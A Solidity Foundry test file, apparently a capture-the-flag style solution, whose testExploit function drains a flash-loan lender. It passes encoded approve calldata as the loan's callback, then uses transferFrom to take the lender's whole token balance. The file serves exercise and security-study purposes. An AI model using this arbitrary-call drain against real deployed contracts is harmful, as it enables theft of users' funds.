// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {BadCallerBaseTest} from "./BadCallerBase.t.sol";

contract BadCallerTest is BadCallerBaseTest {
    function testExploit() external validation {
        vm.startPrank(victim);
        // console2.log("token: ", token.balanceOf(address(lender)));
        // console2.log("lender assets: ", lender.assets());
        // console2.log("msg.sender: ", msg.sender);
        // console2.log("victim: ", victim);
        // console2.log("token: ", address(token));
        // console2.log("lender: ", address(lender));

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(victim), token.balanceOf(address(lender)));
        lender.flashLoan(address(token), 0, data);
        token.transferFrom(address(lender), msg.sender, token.balanceOf(address(lender)));
        // lender.loanToken.transfer(msg.sender, lender.assets());
        // console2.log("token: %d", token.balanceOf(address(lender)));
        // console2.log("lender: %d", lender.assets());
        vm.stopPrank();
    }
}
